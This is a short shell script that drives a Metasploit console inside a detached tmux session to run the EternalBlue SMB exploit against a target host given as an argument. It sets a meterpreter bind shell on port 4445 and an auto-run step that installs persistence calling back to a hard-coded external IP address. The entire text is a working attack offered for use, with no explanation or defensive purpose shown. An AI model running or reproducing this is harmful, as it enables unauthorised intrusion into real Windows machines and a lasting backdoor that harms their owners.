tmux new -s msfcsl -d
tmux send -t "msfcsl" "
use  exploit/windows/smb/ms17_010_eternalblue
set payload windows/meterpreter/bind_tcp
set LPORT     4445
set RHOST     $1
set InitialAutoRunScript \"sessions -C 'run persistence -S -X -i 5 -p 4445 -r 162.219.126.11'\"
run -j -z
" Enter
